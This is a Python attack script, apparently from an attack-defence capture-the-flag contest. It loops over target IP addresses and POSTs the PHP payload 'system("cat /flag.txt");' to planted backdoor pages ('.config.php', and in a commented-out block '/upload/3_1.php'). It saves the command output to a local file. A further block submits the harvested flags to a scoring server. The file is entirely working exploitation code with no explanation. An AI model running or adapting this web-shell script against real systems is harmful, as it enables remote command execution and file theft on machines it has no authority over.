import requests

flags = []
for i in range(100,101):
    i = str(i)
    url = 'http://4.4.1.%s:80/.config.php' % i
    header = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': '4.4.1.%s:80' % i,
        'Proxy-Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'
    }
    print(url)
    data = {'password': 'system("cat /flag.txt");'}
    try:
        resp = requests.post(url,data=data,headers=header,timeout=0.5)
        print(i,resp.text)
        flags.append(resp.text)
        with open("E:\\flag.txt", "a",encoding='utf-8') as fw:
            fw.write('%s,%s'%(i,resp.text))
    except:
        pass


    # url = 'http://172.16.159.%s:5500/upload/3_1.php' % i
    # header = {
    #     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    #     'Accept-Encoding': 'gzip, deflate',
    #     'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
    #     'Cache-Control': 'max-age=0',
    #     'Content-Type': 'application/x-www-form-urlencoded',
    #     'Host': '172.16.159.%s:5500' % i,
    #     'Proxy-Connection': 'keep-alive',
    #     'Upgrade-Insecure-Requests': '1',
    #     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'
    # }
    # print(url)
    # data = {'cmd': 'system("cat /flag.txt");'}
    # try:
    #     resp = requests.post(url,data=data,headers=header,timeout=0.5)
    #     if 'flag' in resp.text:
    #         print('cmd',i,resp.text)
    #         if resp.text in flags:
    #             continue
    #         flags.append(resp.text)
    #         with open('aaa.txt', 'a') as fw:
    #             fw.write('%s,%s'%(i,resp.text))
    # except:
    #     pass

    '''
        url = 'http://124.223.211.210:8080/flag_file.php?token=team32&flag=%s'%resp.text
        header = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Host': '124.223.211.210:8080',
            'Proxy-Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'
        }
        print(url)
        resp = requests.get(url,headers=header)
        print(resp.text)
        '''
